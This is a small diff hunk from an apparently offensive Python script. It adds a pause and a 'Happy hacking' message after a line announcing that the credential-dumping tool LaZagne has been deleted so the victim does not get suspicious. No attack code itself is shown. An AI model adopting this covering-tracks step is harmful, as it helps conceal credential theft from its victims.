@@ -103,6 +103,8 @@ except:
 
 time.sleep(3)
 print("[+] Lazagne deleted. We do not want the victim to get suspicious!")
+time.sleep(2)
+print("[+] Happy hacking.")
 sys.exit()
     
 
